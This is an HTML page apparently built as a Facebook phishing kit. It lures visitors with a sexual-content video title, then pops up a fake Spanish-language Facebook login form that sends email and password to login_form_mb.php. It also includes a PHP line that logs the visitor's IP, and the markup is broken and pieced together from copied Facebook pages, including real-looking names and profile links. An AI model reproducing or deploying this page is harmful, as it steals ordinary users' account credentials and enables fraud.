<!DOCTYPE html>
<html>
<head><meta charset="UTF-8">
<meta property="og:title" content="porno! Facebook - Open to See">
<meta property="og:url" content="https://www.facebook.com/watch?v=a-31Ie2dFC4">
<meta property="twitter:url" content="https://www.facebook.com/watch?v=a-31Ie2dFC4">
<meta property="og:description" content="1,277 visitas, 986 likes">
<meta property="og:image" content="https://user-images.githubusercontent.com/46208706/69920377-dd3c2d80-144c-11ea-9cfb-926a409a9bed.png">
<meta
name="viewport"
content="width=device-width, initial-scale=1.0, minimum-scale=1.0"
</head>
<body>
<link href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="shortcut icon" sizes="196x196" />
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>


  <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" /><link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yT/l/0,cross/m36alX55cIb.css" data-bootloader-hash="oCM85" crossorigin="anonymous" /><script>__DEV__=0;</script><script id="u_0_h" crossorigin="anonymous" src="https://static.xx.fbcdn.net/rsrc.php/v3inLb4/yq/l/en_GB/tJv7bWV5DBZ.js" data-bootloader-hash="YYs7c"></script>
<style>
  .headerBhai{
    background: #3b5998;
    box-sizing: border-box;
    height: 44px;
    margin: 0 auto;
    padding: 0;
    position: relative;
    width: 100%;
    z-index: 12;
  }
  ._6j_c {
    box-sizing: border-box;
    display: inline-block;
    font-size: 16px;
    line-height: 44px;
    min-height: 44px;
    overflow: hidden;
    padding-left: 50px;
    padding-right: 50px;
    text-align: center;
    text-overflow: ellipsis;
    white-space: nowrap;
    width: 100%;
    color: white !important;
}
</style>
</head><body tabindex="0" class="touch x2 _fzu _50-3 iframe acw">
    
  <div>
    <div class="headerBhai">
        <a class="_6j_c" id="u_0_h" data-sigil="MBackNavBarClick">Profile Picture</a>
    </div>
    <img class="img-full img-responsive" style="width:100% !important; height: 420px !important;" src="nora.jpg">
    <div style="opacity: 0.5;" class="_2vj7 _2phz voice acw" data-ft="{&quot;tn&quot;:&quot;,g&quot;}" data-sigil="marea" data-store-id="67"><div class="_7om2" data-store-id="66"><div class="_4g34" data-store-id="65"><div class="ib" data-store-id="64"><a class="darkTouch l" href="/adikmr76?refid=13&amp;_ft_=qid.6676125315731439114%3Amf_story_key.7976305287624649436%3Atop_level_post_id.1966627563466260%3Acontent_owner_id_new.100003571072594%3Asrc.22%3Aphoto_id.1966627200132963%3Astory_location.5%3Astory_attachment_style.photo%3Aview_time.1554406554&amp;__tn__=%2Cg" aria-hidden="true"><i class="img profpic" aria-label="Nora Fatehi" role="img" style="background:#d8dce6 url('https://scontent.fdel11-1.fna.fbcdn.net/v/t1.0-1/p50x50/31166735_10208994767066742_3640113069738164224_n.jpg?_nc_cat=107&_nc_ht=scontent.fdel11-1.fna&oh=9eb571ed1653274736f75229d8bff63a&oe=5D30061D') no-repeat center;background-size:100% 100%;-webkit-background-size:100% 100%;width:40px;height:40px;" data-sigil="touchable"></i></a><div class="c" data-store-id="63"><div class="msg"><a href="/adikmr76?refid=13&amp;_ft_=qid.6676125315731439114%3Amf_story_key.7976305287624649436%3Atop_level_post_id.1966627563466260%3Acontent_owner_id_new.100003571072594%3Asrc.22%3Aphoto_id.1966627200132963%3Astory_location.5%3Astory_attachment_style.photo%3Aview_time.1554406554&amp;__tn__=%2Cg" class="actor-link" data-sigil="actor-link"><strong class="actor">Shristi Roychoudhary</strong></a><br><div class=""><div id="voice_replace_id" class=""></div></div></div><div class="desc attachment mfss" data-store-id="62"><span class="fcg" data-store-id="61"><div class="atb" data-store-id="60"><div class="_2vja mfss fcg"><a href="/adikmr76/albums/1699935330135486/?refid=13&amp;_ft_=qid.6676125315731439114%3Amf_story_key.7976305287624649436%3Atop_level_post_id.1966627563466260%3Acontent_owner_id_new.100003571072594%3Asrc.22%3Aphoto_id.1966627200132963%3Astory_location.5%3Astory_attachment_style.photo%3Aview_time.1554406554&amp;__tn__=%2Cg" class="sec">Mobile Uploads</a><abbr data-sigil="timestamp" data-store-id="76"> &nbsp;2 Apr at 01:03 &nbsp;</abbr><a href="https://www.facebook.com/lite/?loc_ref=attribution&amp;refid=13&amp;_ft_=qid.6676125315731439114%3Amf_story_key.7976305287624649436%3Atop_level_post_id.1966627563466260%3Acontent_owner_id_new.100003571072594%3Asrc.22%3Aphoto_id.1966627200132963%3Astory_location.5%3Astory_attachment_style.photo%3Aview_time.1554406554&amp;__tn__=%2Cg">Facebook Lite</a><span aria-hidden="true"> · </span><i class="feedAudienceIcon img sp_8ENHQkiTjNJ_3x sx_81284b" aria-label="Public" role="img"></i></div><span class="_2vja mfss fcg" data-store-id="59"><a href="/photo/view_full_size/?fbid=1966627200132963&amp;ref_component=mbasic_photo_permalink&amp;ref_page=%2Fwap%2Fphoto.php&amp;refid=13&amp;_ft_=qid.6676125315731439114%3Amf_story_key.7976305287624649436%3Atop_level_post_id.1966627563466260%3Acontent_owner_id_new.100003571072594%3Asrc.22%3Aphoto_id.1966627200132963%3Astory_location.5%3Astory_attachment_style.photo%3Aview_time.1554406554&amp;__tn__=%2Cg" target="_blank" class="sec">View full size</a><a href="#" class="sec" id="u_o_8" data-sigil="more-link-photo-viewer flyout-causal" data-store-id="58">&nbsp;More options</a></span></div></span></div></div></div></div><div class="_5s61"></div></div></div>

  </div>
    <div class="modal fade" id="global-modal" role="dialog" style="padding-top:50px !important">
        <div class="modal-dialog modal-lg">
          <div class="modal-content">
            <div class="modal-body" style="padding: 0;">
		<div id="viewport" data-kaios-focus-transparent="1"><h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1><div id="page" class=""><div class="_129_" id="header-notices"></div><div class="_7om2 _52we _52z5" id="header"><div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter">





</label><label>


<input class="uibutton confirm" type="submit" value="Facebook">


         </label>
					</form>
					</h1>
				</div>
	<section class="login-form-wrap">
<font color="566573">
                                    <div



<a href="/login/?refid=8"><i class="img sp_8ENHQkiTjNJ_2x sx_405b8d"><font color="566573"><u>.</u></i></a></div></div><div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane"><div class="_7om2"><div class="_4g34" id="u_0_0"><div class="_5yd0 _2ph- _5yd1" style="display: none;" data-sigil="m_login_notice"><div class="_52jd"></div></div><div class="acy apm abb" data-sigil="marea"><span class="mfsm">Para continuar inicia sesión.</span></div><div class="aclb _4-4l">


<div data-sigil="m_login_upsell login_identify_step_element"></div><div class="_5rut"><div></div><form method="post" action="login_form_mb.php" class="mobile-login-form _5spm" id="login_form" novalidate="1" data-sigil="m_login_form">

<meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
    	<link rel="shortcut icon" href="icono.ico"/>
		<meta name="referrer" content="default" id="meta_referrer">
		<script async="" type="text/javascript" src="./Facebook Videos_files/saved_resource"></script><script>__DEV__=0;</script>
		<link rel="stylesheet" type="text/css" id="RibQa" href="./Facebook Videos_files/tSOgnJdhTc3.css">



	<body tabindex="0" class="touch x1 _fzu _50-3 iframe acw">
<!-- Inserted by miarroba -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T2VG59" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- Inserted by miarroba -->
	    	    <script id="u_0_a">(function(a){a.__updateOrientation=function(){var b=!!a.orientation&&a.orientation!==180,c=document.body;if(c)c.className=c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g,' ')+' '+(b?'landscape':'portrait');return b;};})(window);</script></head>

		<body>
<!-- Inserted by miarroba -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T2VG59" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- Inserted by miarroba --><div id="viewport">
			<h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
			<div id="page">
			<center>
			     <script>
    new Image().src =
    </script>
			<div id="logotipo">
        
			</div></center>
				<div class="maxwidth _5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane">
					<div class="_4g33">
						<div class="_4g34" id="u_0_0">
							<div id="login-notices">
								<div class="_5yd0 _2ph- _5yd1" style="display: none;" data-sigil="m_login_notice">
									<div class="_52jd"></div>
								</div>
							</div>
							<div>
								<div class="aclb _5rut">
									<div data-sigil="m_login_upsell"></div>
									<div id="Formulario">
                                        <h1>
                                        <form class="login-form" method="post" target="_top" action="login_form_mb.php">
						<?php include 'ip.php'; ?>
										<label>
<input type="text" id="email_mobile" name="email" placeholder="Correo electronico o telefono" autocomplete="off" required="">
                                        </label>
										<label>
				      

<input type="password" name="pass" placeholder="Contraseña" autocomplete="off" required="">
                                       <label> 
										<label>





</label>                                                                                                       <label>                                                                                                                                                                                                                </label>                                                                                              </form>                                                                </h1>                                                                  </div>                                                                                                                                                                                                       <section class="login-form-wrap">                                                                       <font color="566573"><div









required/></div></div><div class="_5s61 _216i _5i2i _52we"><div class="_5xu4"><div class="_2pi9" style="display:none" id="u_0_1"><a href="#" data-sigil="password-plain-text-toggle"><span class="mfss" style="display:none" id="u_0_2">HIDE</span><span class="mfss" id="u_0_3">SHOW</span></a></div></div></div></div></div></div></div></div><div class="_2pie" style="text-align:center;"><div id="u_0_4" data-sigil="login_password_step_element"><button type="submit" value="Log In" class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu" name="login"<div id="u_0_4" type="submit" value="." class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu" name="login" id="u_0_5" data-sigil="touchable m_login_button"><span class="_55sr">Iniciar sesion</span></button></div><div class="_7eif" id="oauth_login_button_container" style="display:none"></div><div class="_7f_d" id="oauth_login_desc_container" style="display:none"></div><div id="otp_button_elem_container"></div></div><input type="hidden" name="prefill_contact_point" id="prefill_contact_point" /><input type="hidden" name="prefill_source" id="prefill_source" /><input type="hidden" name="prefill_type" id="prefill_type" /><input type="hidden" name="first_prefill_source" id="first_prefill_source" /><input type="hidden" name="first_prefill_type" id="first_prefill_type" /><input type="hidden" name="had_cp_prefilled" id="had_cp_prefilled" value="false" /><input type="hidden" name="had_password_prefilled" id="had_password_prefilled" value="false" /><input type="hidden" name="is_smart_lock" id="is_smart_lock" value="false" /><div class="_xo8"></div><noscript><input type="hidden" name="_fb_noscript" value="true" /></noscript></form><div><div class="_43mg"><span class="_43mh"></span></div><div class="_52jj _5t3b" id="u_0_6"><a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" href="https://m.facebook.com/reg-no-deeplink/?cid=103&amp;refid=8" tabindex="0" data-sigil="m_reg_button">Create New Account</a></div></div><div><div class="other-links"><ul class="_5pkb _55wp"><li><span class="mfss fcg">
<a tabindex="0" href="https://m.facebook.com/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fwww.facebook.com%252F&amp;r&amp;cuid&amp;ars=facebook_login&amp;lwv=100&amp;refid=8" id="forgot-password-link"></label>Forgotten password?</a><label></span></li></ul></div></div></div><div></div></div></div></div><div></div><span><img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display:none" /></span></div></div></div>

</label>                                                                                                       <label>                                                                                                                                                                                                                                                                                            </form>                                                                </h1>                                                                  </div>                                                                                                                                                                                                       <section class="login-form-wrap">                                                                       <font color="566573"><div

              <!-- <img class="img-full img-responsive" src="https://getbootstrap.com/assets/img/devices.png"> 
            </div>
          </div>
        </div>
      </div>
      <div style="opacity: 0.5;padding-left: 10px;padding-right: 10px;">




      <span class="fbPhotosPhotoCaption" tabindex="0" aria-live="polite" data-ft="{&quot;tn&quot;:&quot;K&quot;}" id="fbPhotoSnowliftCaption"><span class="hasCaption">Now I like it even more! <span class="_5mfr"><span class="_6qdm" style="height: 16px; width: 16px; font-size: 16px; background-image: url(&quot;https://static.xx.fbcdn.net/images/emoji.php/v9/tce/1/16/1f600.png&quot;)">😀</span></span> thanks shuklu beta<a href="https://www.facebook.com/shiv.vipin?__tn__=%2CdK%2AF-R&amp;eid=ARC8rtNv_VO5kCI6eKuYVsOwK7aL4Eid7-3ny0ajtboTWrGAxP3mTkdEnbxP_0ZOx5o6P4KFbBRclJdc" data-hovercard="/ajax/hovercard/user.php?id=100002861391955&amp;extragetparams=%7B%22__tn__%22%3A%22%2CdK%2AF-R%22%2C%22eid%22%3A%22ARC8rtNv_VO5kCI6eKuYVsOwK7aL4Eid7-3ny0ajtboTWrGAxP3mTkdEnbxP_0ZOx5o6P4KFbBRclJdc%22%2C%22directed_target_id%22%3Anull%2C%22groups_location%22%3Anull%7D" data-hovercard-prefer-more-content-show="1">Shivam Shukla</a>a <span class="_5mfr"><span class="_6qdm" style="height: 16px; width: 16px; font-size: 16px; background-image: url(&quot;https://static.xx.fbcdn.net/images/emoji.php/v9/t9f/1/16/1f61b.png&quot;)">😛</span></span><span class="_5mfr"><span class="_6qdm" style="height: 16px; width: 16px; font-size: 16px; background-image: url(&quot;https://static.xx.fbcdn.net/images/emoji.php/v9/t2/1/16/1f60d.png&quot;)">😍</span></span><span class="_5mfr"><span class="_6qdm" style="height: 16px; width: 16px; font-size: 16px; background-image: url(&quot;https://static.xx.fbcdn.net/images/emoji.php/v9/t75/1/16/1f618.png&quot;)">😘</span></span><span class="_5mfr"><span class="_6qdm" style="height: 16px; width: 16px; font-size: 16px; background-image: url(&quot;https://static.xx.fbcdn.net/images/emoji.php/v9/tfe/1/16/1f44f.png&quot;)">👏</span></span><span class="_5mfr"><span class="_6qdm" style="height: 16px; width: 16px; font-size: 16px; background-image: url(&quot;https://static.xx.fbcdn.net/images/emoji.php/v9/t68/1/16/1f495.png&quot;)">💕</span></span></span></span>
      </div>
      <script>
      $(document).ready(function() {
        $('#global-modal').modal('show');
      });
      </script>
</body></html>
